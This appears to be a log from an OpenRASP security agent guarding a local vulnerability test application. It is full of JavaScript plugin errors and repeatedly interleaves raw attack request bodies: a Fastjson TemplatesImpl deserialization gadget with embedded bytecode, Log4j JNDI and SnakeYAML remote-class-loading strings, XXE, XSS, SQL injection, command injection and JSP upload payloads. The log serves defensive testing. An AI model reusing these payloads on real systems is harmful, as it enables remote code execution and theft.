W5nL1N0cmluZzspVgEACm9wZW5TdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAD3ByaW50U3RhY2tUcmFjZQAhAAgACQAAAAAABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAAsADgAAAAwAAQAAAAUADwAQAAAAAQARABIAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAABgADgAAACAAAwAAAAEADwAQAAAAAAABABMAFAABAAAAAQAVABYAAgAXAAAABAABABgAAQARABkAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAB0ADgAAACoABAAAAAEADwAQAAAAAAABABMAFAABAAAAAQAaABsAAgAAAAEAHAAdAAMAFwAAAAQAAQAYAAgAHgALAAEADAAAAGUAAwABAAAAFrsAAlkSA7cABLYABVenAAhLKrYAB7EAAQAAAA0AEAAGAAMADQAAABYABQAAAA8ADQASABAAEAARABEAFQATAA4AAAAMAAEAEQAEAB8AIAAAACEAAAAHAAJQBwAiBAABACMAAAACACQ%3D%22%5D%2C%22outputProperties%22%3A%7B%7D%7D%5D%7D"config":[{"id":"<script>alert(document.cookie)</script>"}]}"exp": "new java.io.File('/usr').list()"}file=%2Fusr%2Fshare%2Flocale%2Flocale.alias----------------------------197926294059353965405621
+SyntaxError: Unexpected token j in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:45,510 INFO  [http-nio-8002-exec-39][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+----------------------------928190981909985041339124
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:45,761 INFO  [http-nio-8002-exec-56][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"root": {"url":"https://www.baidu.com"}}----------------------------704053425783173750491401
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:45,762 INFO  [http-nio-8002-exec-62][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+file=1.txt&dest=1.jsp----------------------------688221571446797263900759
+SyntaxError: Unexpected token i in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:45,872 INFO  [http-nio-8002-exec-51][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/okHttp3.do <native code>:0
+"file": "./1.txt"}root><file>/usr/share/locale/locale.alias</file></root>str=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E"root":{"xml":"<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>"}}"req":"POST /FileUpload/upload.do HTTP/1.1\nHost: localhost:8001\nContent-Length: 539\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: null\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryWqGd83IIbg2U327I\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n\n------WebKitFormBoundaryWqGd83IIbg2U327I\nContent-Disposition: form-data; name=\"username\"\n\nadmin\n------WebKitFormBoundaryWqGd83IIbg2U327I\nContent
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:46,078 INFO  [http-nio-8002-exec-14][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"exp": "new java.io.File('/usr').list()"}"root": {"file": "/etc", "suffix": "ntp.conf"}}"root": {"userId": "${jndi:ldap://localhost:8888}"}}root><file>./1.txt</file></root>
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:46,392 INFO  [http-nio-8002-exec-23][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+root><file>1.txt</file><dest>1.jsp</dest></root>"xml": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://localhost:8888/exp.jar']]]]"}root><file>/usr/share/locale/locale.alias</file></root>file=%2Fusr%2Fshare%2Flocale%2Flocale.alias"exp": "new java.io.File('/usr').list()"}url=https%3A%2F%2Fwww.baidu.com
+SyntaxError: Unexpected token r in JSON at position 0
+    at Object.func (official.js:1675:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:47,470 INFO  [http-nio-8002-exec-53][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+----------------------------446541773329873822470613
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:48,117 INFO  [http-nio-8002-exec-48][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/header/httpClient.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:52,456 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/post/okHttp3.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:52,472 INFO  [http-nio-8002-exec-42][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/xml/httpClient.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:51:54,778 INFO  [http-nio-8002-exec-14][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"exp": "new java.io.File('/usr').list()"}"root": {"file": "/etc", "suffix": "ntp.conf"}}"root": {"userId": "${jndi:ldap://localhost:8888}"}}root><file>./1.txt</file></root>username=%27%2F%2A%2A%2For%2F%2A%2A%2Fusername%3D%27root
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:01,944 INFO  [http-nio-8002-exec-49][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/header/okHttp3.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:02,311 INFO  [http-nio-8002-exec-32][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+document><root><url>https://www.baidu.com</url></root></document>----------------------------415366039725573298561477
+SyntaxError: Unexpected token d in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:04,307 INFO  [http-nio-8002-exec-15][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+----------------------------177459997877022681583376
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:08,036 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+file=%2Fusr%2Fshare%2Flocale%2Flocale.alias----------------------------146254230657383209827769
+SyntaxError: Unexpected token i in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:08,256 INFO  [http-nio-8002-exec-32][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:08,329 INFO  [http-nio-8002-exec-53][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:08,517 INFO  [http-nio-8002-exec-39][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do <native code>:0
+----------------------------928190981909985041339124
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:14,741 INFO  [http-nio-8002-exec-33][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"root": {"url":"https://www.baidu.com"}}root><file>/usr/share/locale/locale.alias</file></root>file=%2Fusr%2Fshare%2Flocale%2Flocale.alias----------------------------921169269866705382995357
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:15,272 INFO  [http-nio-8002-exec-45][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Yaml/yaml.do <native code>:0
+"exp": "new java.io.File('/usr').list()"}file=test.jsp&content=test----------------------------832053076354566320351423
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:16,749 INFO  [http-nio-8002-exec-48][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:17,526 INFO  [http-nio-8002-exec-32][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesWrite.do <native code>:0
+document><root><url>https://www.baidu.com</url></root></document>----------------------------415366039725573298561477
+SyntaxError: Unexpected token d in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:18,910 INFO  [http-nio-8002-exec-16][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:18,972 INFO  [http-nio-8002-exec-58][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:19,098 INFO  [http-nio-8002-exec-34][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/okHttp3.do <native code>:0
+root><file>1.txt</file><dest>1.jsp</dest></root>root><username>'/**/or/**/username='root</username></root>----------------------------060593269755563334505118
+SyntaxError: Unexpected token r in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:19,423 INFO  [http-nio-8002-exec-9][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+xml=%3C%21DOCTYPE%20test%20%5B%3C%21ELEMENT%20test%20ANY%20%3E%3C%21ENTITY%20title%20SYSTEM%20%27file%3A%2F%2F%2Fusr%27%20%3E%5D%3E%3Carticle%3E%3Ctitle%3E%26title%3B%3C%2Ftitle%3E%3C%2Farticle%3Eexp=function%20test%28%29%7B%20return%20java.util.Arrays.toString%28new%0Ajava.io.File%28%27%2Fusr%27%29.list%28%29%29%7D%3Btest%28%29%3B----------------------------894825168250070763599902
+SyntaxError: Unexpected token x in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:20,057 INFO  [http-nio-8002-exec-18][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do <native code>:0
+json=%7B%22notes%22%3A%5B%22org.apache.xalan.xsltc.trax.TemplatesImpl%22%2C%7B%22transletName%22%3A%22businessObject%22%2C%22transletBytecodes%22%3A%5B%22yv66vgAAADMAMwoACQAlBwAmCAAnCgACACgKAAIAKQcAKgoABgArBwAsBwAtAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADBMY29tL2FuYmFpL3NlYy9jbGFzc2xvYWRlci9SQVNQQWJzdHJhY3RUcmFuc2xldDsBAAl0cmFuc2Zvcm0BAFAoTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NO1tMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEAHExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTsBABVzZXJpYWxpemF0aW9uSGFuZGxlcnMBADFbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALgEAcyhMb3JnL2FwYWNoZS94YWxhbi94c2x0Yy9ET007TG9yZy9hcGFjaGUveG1sL2R0bS9EVE1BeGlzSXRlcmF0b3I7TG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAA9kdG1BeGlzSXRlcmF0b3IBACRMb3JnL2FwYWNoZS94bWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBABRzZXJpYWxpemF0aW9uSGFuZGxlcgEAMExvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ%2BAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACoBAApTb3VyY2VGaWxlAQAZUkFTUEFic3RyYWN0VHJhbnNsZXQuamF2YQwACgALAQAMamF2YS9uZXQvVVJMAQAaaHR0cDovL2xvY2FsaG9zdDo4ODg4L3Jhc3AMAAoALwwAMAAxAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAMgALAQAuY29tL2FuYmFpL3NlYy9jbGFzc2xvYWRlci9SQVNQQWJzdHJhY3RUcmFuc2xldAEAL29yZy9hcGFjaGUveGFsYW4veHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAob3JnL2FwYWNoZS94YWxhbi94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACm9wZW5TdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAD3ByaW50U3RhY2tUcmFjZQAhAAgACQAAAAAABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAAsADgAAAAwAAQAAAAUADwAQAAAAAQARABIAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAABgADgAAACAAAwAAAAEADwAQAAAAAAABABMAFAABAAAAAQAVABYAAgAXAAAABAABABgAAQARABkAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAB0ADgAAACoABAAAAAEADwAQAAAAAAABABMAFAABAAAAAQAaABsAAgAAAAEAHAAdAAMAFwAAAAQAAQAYAAgAHgALAAEADAAAAGUAAwABAAAAFrsAAlkSA7cABLYABVenAAhLKrYAB7EAAQAAAA0AEAAGAAMADQAAABYABQAAAA8ADQASABAAEAARABEAFQATAA4AAAAMAAEAEQAEAB8AIAAAACEAAAAHAAJQBwAiBAABACMAAAACACQ%3D%22%5D%2C%22outputProperties%22%3A%7B%7D%7D%5D%7D"config":[{"id":"<script>alert(document.cookie)</script>"}]}"exp": "new java.io.File('/usr').list()"}file=%2Fusr%2Fshare%2Flocale%2Flocale.alias----------------------------197926294059353965405621
+SyntaxError: Unexpected token j in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:20,654 INFO  [http-nio-8002-exec-33][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"root": {"url":"https://www.baidu.com"}}root><file>/usr/share/locale/locale.alias</file></root>file=%2Fusr%2Fshare%2Flocale%2Flocale.alias----------------------------921169269866705382995357
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:20,669 INFO  [http-nio-8002-exec-53][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+----------------------------446541773329873822470613
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:20,810 INFO  [http-nio-8002-exec-60][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpConnection.do <native code>:0
+----------------------------359470030495920476667330
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:20,810 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpConnection.do <native code>:0
+root><file>./1.txt</file></root>root><file>./1.txt</file></root>root><file>test.jsp</file><content>test</content></root>"cmd": "whoami"}
+SyntaxError: Unexpected token r in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:21,383 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+----------------------------834405827692088986602043
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:21,641 INFO  [http-nio-8002-exec-14][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Deserialization/readObject.do <native code>:0
+"exp": "new java.io.File('/usr').list()"}"root": {"file": "/etc", "suffix": "ntp.conf"}}"root": {"userId": "${jndi:ldap://localhost:8888}"}}root><file>./1.txt</file></root>username=%27%2F%2A%2A%2For%2F%2A%2A%2Fusername%3D%27root----------------------------590760466049545375831598
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:21,655 INFO  [http-nio-8002-exec-18][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+json=%7B%22notes%22%3A%5B%22org.apache.xalan.xsltc.trax.TemplatesImpl%22%2C%7B%22transletName%22%3A%22businessObject%22%2C%22transletBytecodes%22%3A%5B%22yv66vgAAADMAMwoACQAlBwAmCAAnCgACACgKAAIAKQcAKgoABgArBwAsBwAtAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADBMY29tL2FuYmFpL3NlYy9jbGFzc2xvYWRlci9SQVNQQWJzdHJhY3RUcmFuc2xldDsBAAl0cmFuc2Zvcm0BAFAoTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NO1tMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEAHExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTsBABVzZXJpYWxpemF0aW9uSGFuZGxlcnMBADFbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALgEAcyhMb3JnL2FwYWNoZS94YWxhbi94c2x0Yy9ET007TG9yZy9hcGFjaGUveG1sL2R0bS9EVE1BeGlzSXRlcmF0b3I7TG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAA9kdG1BeGlzSXRlcmF0b3IBACRMb3JnL2FwYWNoZS94bWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBABRzZXJpYWxpemF0aW9uSGFuZGxlcgEAMExvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ%2BAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACoBAApTb3VyY2VGaWxlAQAZUkFTUEFic3RyYWN0VHJhbnNsZXQuamF2YQwACgALAQAMamF2YS9uZXQvVVJMAQAaaHR0cDovL2xvY2FsaG9zdDo4ODg4L3Jhc3AMAAoALwwAMAAxAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAMgALAQAuY29tL2FuYmFpL3NlYy9jbGFzc2xvYWRlci9SQVNQQWJzdHJhY3RUcmFuc2xldAEAL29yZy9hcGFjaGUveGFsYW4veHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAob3JnL2FwYWNoZS94YWxhbi94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACm9wZW5TdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAD3ByaW50U3RhY2tUcmFjZQAhAAgACQAAAAAABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAAsADgAAAAwAAQAAAAUADwAQAAAAAQARABIAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAABgADgAAACAAAwAAAAEADwAQAAAAAAABABMAFAABAAAAAQAVABYAAgAXAAAABAABABgAAQARABkAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAB0ADgAAACoABAAAAAEADwAQAAAAAAABABMAFAABAAAAAQAaABsAAgAAAAEAHAAdAAMAFwAAAAQAAQAYAAgAHgALAAEADAAAAGUAAwABAAAAFrsAAlkSA7cABLYABVenAAhLKrYAB7EAAQAAAA0AEAAGAAMADQAAABYABQAAAA8ADQASABAAEAARABEAFQATAA4AAAAMAAEAEQAEAB8AIAAAACEAAAAHAAJQBwAiBAABACMAAAACACQ%3D%22%5D%2C%22outputProperties%22%3A%7B%7D%7D%5D%7D"config":[{"id":"<script>alert(document.cookie)</script>"}]}"exp": "new java.io.File('/usr').list()"}file=%2Fusr%2Fshare%2Flocale%2Flocale.alias----------------------------197926294059353965405621
+SyntaxError: Unexpected token j in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:22,210 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"exp": "new java.io.File('/usr').list()"}root><file>1.txt</file><dest>1.jsp</dest></root>----------------------------515845671470640735974979
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:22,496 INFO  [http-nio-8002-exec-21][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/post/cmd.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:22,944 INFO  [http-nio-8002-exec-29][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do <native code>:0
+"file": "/usr/share/locale/locale.alias"}"file": "test.jsp", "content": "test"}root><cmd>whoami</cmd></root>root><file>./1.txt</file></root>root><cmd>whoami</cmd></root>"cmd": "whoami"}----------------------------993580181549946821717634
+SyntaxError: Unexpected token : in JSON at position 6
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:26,925 INFO  [http-nio-8002-exec-62][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/okHttp3.do <native code>:0
+file=1.txt&dest=1.jsp----------------------------688221571446797263900759
+SyntaxError: Unexpected token i in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:28,731 INFO  [http-nio-8002-exec-61][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:28,803 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:34,206 INFO  [http-nio-8002-exec-41][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:36,456 INFO  [http-nio-8002-exec-14][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do <native code>:0
+"exp": "new java.io.File('/usr').list()"}"root": {"file": "/etc", "suffix": "ntp.conf"}}"root": {"userId": "${jndi:ldap://localhost:8888}"}}root><file>./1.txt</file></root>username=%27%2F%2A%2A%2For%2F%2A%2A%2Fusername%3D%27root----------------------------590760466049545375831598
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:38,376 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/httpClient.do <native code>:0
+root><file>./1.txt</file></root>root><file>./1.txt</file></root>root><file>test.jsp</file><content>test</content></root>"cmd": "whoami"}
+SyntaxError: Unexpected token r in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:41,700 INFO  [http-nio-8002-exec-9][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:41,746 INFO  [http-nio-8002-exec-15][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:42,858 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/okHttp3.do <native code>:0
+----------------------------834405827692088986602043
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:50,630 INFO  [http-nio-8002-exec-35][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:53,786 INFO  [http-nio-8002-exec-41][com.baidu.openrasp.plugin.js.log] official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:53,967 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+root><file>./1.txt</file></root>root><file>./1.txt</file></root>root><file>test.jsp</file><content>test</content></root>"cmd": "whoami"}
+SyntaxError: Unexpected token r in JSON at position 0
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:54,408 INFO  [http-nio-8002-exec-15][com.baidu.openrasp.plugin.js.log] http://localhost:8002/SSRF/json/okHttp3.do <native code>:0
+----------------------------177459997877022681583376
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:54,702 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/renameTo.do <native code>:0
+----------------------------834405827692088986602043
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:52:55,109 INFO  [http-nio-8002-exec-60][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+----------------------------359470030495920476667330
+SyntaxError: Unexpected number in JSON at position 1
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
